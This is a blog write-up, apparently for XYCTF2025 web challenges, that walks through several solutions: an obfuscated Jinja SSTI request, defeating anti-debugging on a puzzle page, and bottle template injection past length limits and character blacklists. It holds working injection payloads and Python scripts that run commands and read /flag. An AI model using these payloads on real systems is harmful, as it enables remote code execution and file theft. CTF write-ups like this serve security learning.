<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /H3dden_route?spell=fly-%23%7D&#123;%for%0ai%0ain%0arequest.endpoint|string|slice(1)%&#125;&#123;%set%0adat=i.9~i.2~i.18~i.2%&#125;&#123;%for%0aj%0ain%0arequest|attr(dat)|string|slice(1)%&#125;&#123;%set%0alip=j.22~j.19~j.26~j.29~j.31~j.23%&#125;&#123;%set%0aglo=j.37~j.37~j.17~j.22~j.25~j.0~j.11~j.22~j.29~j.37~j.37%&#125;&#123;%set%0abuil=j.37~j.37~j.0~j.31~j.19~j.22~j.30~j.19~j.24~j.29~j.37~j.37%&#125;&#123;%set%0aset=j.29~j.15~j.30~j.11~j.30~j.30~j.28%&#125;&#123;%set%0aspe=j.37~j.37~j.29~j.26~j.15~j.13~j.37~j.37%&#125;&#123;%set%0aini=j.37~j.37~j.19~j.24~j.19~j.30~j.37~j.37%&#125;&#123;%set%0as=j.29~j.35~j.29%&#125;&#123;%set%0amod=j.23~j.25~j.14~j.31~j.22~j.15~j.29%&#125;&#123;%set%0awer=j.33~j.15~j.28~j.21~j.36~j.15~j.31~j.17%&#125;&#123;%set%0aget=j.37~j.37~j.17~j.15~j.30~j.19~j.30~j.15~j.23~j.37~j.37%&#125;&#123;%set%0aserv=j.29~j.15~j.28~j.32~j.19~j.24~j.17%&#125;&#123;%set%0awsg=j.41~j.42~j.43~j.44~j.45~j.15~j.27~j.31~j.15~j.29~j.30~j.46~j.11~j.24~j.14~j.22~j.15~j.28%&#125;&#123;%set%0averi=j.26~j.28~j.25~j.30~j.25~j.13~j.25~j.22~j.37~j.32~j.15~j.28~j.29~j.19~j.25~j.24%&#125;&#123;%set%0aso=j.25~j.29%&#125;&#123;%set%0asv=j.29~j.15~j.28~j.32~j.15~j.28~j.37~j.32~j.15~j.28~j.29~j.19~j.25~j.24%&#125;&#123;%set%0apen=j.26~j.25~j.26~j.15~j.24%&#125;&#123;%set%0aap=j.11~j.26~j.26~j.22~j.19~j.13~j.11~j.30~j.19~j.25~j.24%&#125;&#123;%set%0aop=j.26~j.25~j.26%&#125;&#123;%set%0aim=j.37~j.37~j.19~j.23~j.26~j.25~j.28~j.30~j.37~j.37%&#125;&#123;%set%0aiml=j.19~j.23~j.26~j.25~j.28~j.30~j.22~j.19~j.0%&#125;&#123;%set%0aloa=j.28~j.15~j.22~j.25~j.11~j.14%&#125;&#123;%set%0ard=j.28~j.15~j.11~j.14%&#125;&#123;%set%0aco=j.0~j.11~j.29~j.15~j.7~j.5~j.47~j.48~j.16~j.49%&#125;&#123;%print(g|attr(op)|attr(glo)|attr(get)(buil)|attr(get)(im)(iml)|attr(loa)(g|attr(op)|attr(glo)|attr(get)(buil)|attr(get)(im)(so)))%&#125;&#123;%print(g|attr(op)|attr(glo)|attr(get)(buil)|attr(get)(set)(g|attr(op)|attr(glo)|attr(get)(s)|attr(mod)|attr(get)(wer)|attr(serv)|attr(wsg),veri,g|attr(op)|attr(glo)|attr(get)(buil)|attr(get)(im)(so)|attr(pen)(co)|attr(rd)()))%&#125;&#123;%endfor%&#125;&#123;%endfor%&#125;%7B%23 HTTP/1.1</span><br><span class="line">Host: gz.imxbt.cn:20051</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line">123456789abcdefghijklmnopqrstuvwxyz_-&#123;&#125;WSGIRH /*</span><br></pre></td></tr></table></figure>

<img src="/2025/04/09/XYCTF2025-Web-wp/image-20250409144049671.png" class="" title="This is an example image">

<p>把图片下载下载，感觉flag已经到手了。。</p>
<img src="/2025/04/09/XYCTF2025-Web-wp/image-20250409150146227.png" class="" title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;__M@g1c1@ans_M@stering_M@g1c__&#125;</span><br></pre></td></tr></table></figure>





<h2 id="ez-puzzle"><a href="#ez-puzzle" class="headerlink" title="ez_puzzle"></a>ez_puzzle</h2><p>这道题f12和右键都不行，连在其他页面打开f12再转到题目界面也不行。还能用快捷键来打开，<code>ctrl+shift+i</code></p>
<img src="/2025/04/09/XYCTF2025-Web-wp/image-20250408155014946.png" class="" title="This is an example image">

<p>打开源代码后会停在一个debugger的地方，然后一直循环，这是一个反调试的措施。我们可以选中这段代码右键进行忽略，这样我们就不能调试了。</p>
<img src="/2025/04/09/XYCTF2025-Web-wp/image-20250408155106925.png" class="" title="This is an example image">

<p>我们全局搜一下alert看看</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (G &lt; yw4) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(O[s74](<span class="variable constant_">J74</span>))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">alert</span>($vfeRha_calc(<span class="variable constant_">S74</span> + G / <span class="title class_">Rw4</span>, <span class="variable constant_">Y74</span>, $v5sNVR(vS4)))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">void</span> (O[t74] = !<span class="number">0x1</span>,</span><br><span class="line">    location[<span class="variable constant_">K74</span>]())</span><br></pre></td></tr></table></figure>

<p>发现yw4的值是2000，那么第一个alert里面的东西肯定就是flag了，但是我们上面有反调试，将其忽略后我们打断点也没有用了，那怎么办呢？只能正常进行，但是时间是可以更改的。</p>
<p>那我们直接把yw4改成超级大</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yw4=9999999999999</span><br></pre></td></tr></table></figure>

<p>然后拼好拼图就拿到了flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0u__aRe_a_mAsteR_of_PUzZL!!@!!~!&#125;</span><br></pre></td></tr></table></figure>





<h2 id="出题人已疯"><a href="#出题人已疯" class="headerlink" title="出题人已疯"></a>出题人已疯</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   app.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 15:52:17</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/attack&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    payload = bottle.request.query.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload <span class="keyword">and</span> <span class="built_in">len</span>(payload) &lt; <span class="number">25</span> <span class="keyword">and</span> <span class="string">&#x27;open&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload <span class="keyword">and</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload:</span><br><span class="line">        <span class="keyword">return</span> bottle.template(<span class="string">&#x27;hello &#x27;</span>+payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bottle.abort(<span class="number">400</span>, <span class="string">&#x27;Invalid payload&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>只限制了字数，<code>open</code>和<code>\</code>，跟vnctf有点像，但是vnctf是有多行的，可以用海象运算法来进行拼接从而绕过字数限制。但是这里只有一行。</p>
<p>我们继续用拼接的方法来实现！</p>
<p>我们用<code>%</code>的方法，因为字数最短！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /attack?payload=%0a%import%20bottle;bottle.c=&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot; HTTP/1.1</span><br><span class="line"></span><br><span class="line">GET /attack?payload=%0a%import%20bottle;eval(bottle.c) HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>服务端回显如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 - - [09/Apr/2025 11:17:37] &quot;GET /attack?payload=%0a%import%20bottle;bottle.c=&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot; HTTP/1.1&quot; 200 7</span><br><span class="line">127.0.0.1 - - [09/Apr/2025 11:17:58] &quot;GET /attack?payload=%0a%import%20bottle;eval(bottle.c) HTTP/1.1&quot; 200 7</span><br><span class="line">meteor-kai\ty</span><br></pre></td></tr></table></figure>

<p>这里有<code>%0a</code>的原因是因为<code>%</code>被嵌入在普通文本中，因此要先换行。</p>
<p>那么我们接下来拼接一下<code>bottle.c</code>的命令即可。</p>
<p>同时既然要字数少，我们找一个字数最短的模块，也就是<code>os</code>！</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://gz.imxbt.cn:20994/attack&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f*&gt;123.txt&#x27;)&quot;</span></span><br><span class="line">payload=[payload[i:i+<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(payload),<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">        tmp=<span class="string">f&#x27;\n%import os;os.a=&quot;<span class="subst">&#123;payload[i]&#125;</span>&quot;&#x27;</span></span><br><span class="line">        <span class="comment">#print(tmp)</span></span><br><span class="line">        r=requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:tmp&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp=<span class="string">f&#x27;\n%import os;os.a+=&quot;<span class="subst">&#123;payload[i]&#125;</span>&quot;&#x27;</span></span><br><span class="line">        <span class="comment">#print(tmp)</span></span><br><span class="line">        r=requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:tmp&#125;)</span><br><span class="line"></span><br><span class="line">tmp=<span class="string">f&quot;\n%import os;eval(os.a)&quot;</span></span><br><span class="line">r=requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:tmp&#125;)</span><br><span class="line"></span><br><span class="line">tmp=<span class="string">f&quot;\n%include(&#x27;123.txt&#x27;)&quot;</span></span><br><span class="line">r=requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:tmp&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>构造脚本的时候遇到了一个小坑，就是以下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmp=<span class="string">f&#x27;\n%import os;os.a=&quot;<span class="subst">&#123;payload[i]&#125;</span>&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>此处包裹<code>&#123;payload[i]&#125;</code>的引号必须为双引号，因为python内部解析时是使用单引号的，如果这里包裹使用单引号会造成一种混淆。</p>
<img src="/2025/04/09/XYCTF2025-Web-wp/image-20250409121045215.png" class="" title="This is an example image">



<p>这里如果长度限制放宽一点，也可以用system来命令执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1:5000/attack&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;whoami&quot;</span></span><br><span class="line">payload=[payload[i:i+<span class="number">3</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(payload),<span class="number">3</span>)]</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">        tmp=<span class="string">f&#x27;\n%import os;os.a=&quot;<span class="subst">&#123;payload[i]&#125;</span>&quot;&#x27;</span></span><br><span class="line">        <span class="comment">#print(tmp)</span></span><br><span class="line">        r=requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:tmp&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp=<span class="string">f&#x27;\n%import os;os.a+=&quot;<span class="subst">&#123;payload[i]&#125;</span>&quot;&#x27;</span></span><br><span class="line">        <span class="comment">#print(tmp)</span></span><br><span class="line">        r=requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:tmp&#125;)</span><br><span class="line"></span><br><span class="line">tmp=<span class="string">f&quot;\n%import os;print(os.a)&quot;</span></span><br><span class="line">r=requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:tmp&#125;)</span><br><span class="line"></span><br><span class="line">tmp=<span class="string">f&quot;\n%import os;os.system(os.a)&quot;</span></span><br><span class="line">r=requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:tmp&#125;)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># tmp=f&quot;\n%include(&#x27;1.txt&#x27;)&quot;</span></span><br><span class="line"><span class="comment"># r=requests.get(url,params=&#123;&quot;payload&quot;:tmp&#125;)</span></span><br><span class="line"><span class="comment"># print(r.text)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;L@men7XU_d0es_n0t_w@nt_t0_g0_t0_scho01&#125;</span><br></pre></td></tr></table></figure>

<p>这个flag是出题人又疯的压缩包密码。</p>
<h2 id="出题人又疯"><a href="#出题人又疯" class="headerlink" title="出题人又疯"></a>出题人又疯</h2><p>这道题的考点是bottle框架斜体字引发的一种ssti，我们需要使用阴性顺序指示符或者阳性顺序指示符来进行。</p>
<p>见：<a target="_blank" rel="noopener" href="https://blog.meteorkai.top/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">https://blog.meteorkai.top/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   app.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 15:52:17</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line">blacklist = [</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;;&#x27;</span> , <span class="string">&#x27;read&#x27;</span></span><br><span class="line">]</span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/attack&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    payload = bottle.request.query.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload <span class="keyword">and</span> <span class="built_in">len</span>(payload) &lt; <span class="number">25</span> <span class="keyword">and</span> <span class="built_in">all</span>(c <span class="keyword">not</span> <span class="keyword">in</span> payload <span class="keyword">for</span> c <span class="keyword">in</span> blacklist):</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="keyword">return</span> bottle.template(<span class="string">&#x27;hello &#x27;</span>+payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bottle.abort(<span class="number">400</span>, <span class="string">&#x27;Invalid payload&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>禁用了好多东西，之前的方法不行了。</p>
<p>原payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.79.128:5000/attack?payload=&#123;&#123;open(%27/flag%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>由于<code>o</code>和<code>read</code>被过滤，那么把<code>a</code>和<code>o</code>替换即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.79.128:5000/attack?payload=&#123;&#123;%BApen(%27/flag%27).re%aad()&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2025/04/09/XYCTF2025-Web-wp/image-20250409123505303.png" class="" title="This is an example image">


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About me</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/categories/">categories</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a href="/links/">links</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fate"><span class="toc-number">1.</span> <span class="toc-text">fate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Signin"><span class="toc-number">2.</span> <span class="toc-text">Signin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezsql-%E6%89%8B%E5%8A%A8%E6%BB%91%E7%A8%BD"><span class="toc-number">3.</span> <span class="toc-text">ezsql(手动滑稽)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Now-you-see-me-1"><span class="toc-number">4.</span> <span class="toc-text">Now you see me 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Now-you-see-me-2"><span class="toc-number">5.</span> <span class="toc-text">Now you see me 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-puzzle"><span class="toc-number">6.</span> <span class="toc-text">ez_puzzle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BA%E9%A2%98%E4%BA%BA%E5%B7%B2%E7%96%AF"><span class="toc-number">7.</span> <span class="toc-text">出题人已疯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BA%E9%A2%98%E4%BA%BA%E5%8F%88%E7%96%AF"><span class="toc-number">8.</span> <span class="toc-text">出题人又疯</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/&text=XYCTF2025 Web wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/&title=XYCTF2025 Web wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/&is_video=false&description=XYCTF2025 Web wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=XYCTF2025 Web wp&body=Check out this article: http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/&title=XYCTF2025 Web wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/&title=XYCTF2025 Web wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/&title=XYCTF2025 Web wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/&title=XYCTF2025 Web wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/&name=XYCTF2025 Web wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2025/04/09/XYCTF2025-Web-wp/&t=XYCTF2025 Web wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        
<footer id="footer">
    <div class="footer-left">
        Copyright ©
        
        
        2024-2025
        Meteor_Kai
        <br>
        <a href="https://www.dkdun.cn/" target="_blank">DK盾</a>
    </div>
    
    <div class="footer-right">
        <nav>
            <ul>
                <!--
                --><li><a href="/">Home</a></li><!--
                --><!--
                --><li><a href="/about/">About me</a></li><!--
                --><!--
                --><li><a href="/archives/">Writing</a></li><!--
                --><!--
                --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
                --><!--
                --><li><a href="/search/">Search</a></li><!--
                --><!--
                --><li><a href="/categories/">categories</a></li><!--
                --><!--
                --><li><a href="/tags/">tags</a></li><!--
                --><!--
                --><li><a href="/links/">links</a></li><!--
                -->
            </ul>
            <ul>
                
                <!-- 不蒜子统计 -->
                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
                <span class="post-meta-divider">|</span>
                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
                
            </ul>
        </nav>
    </div>
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
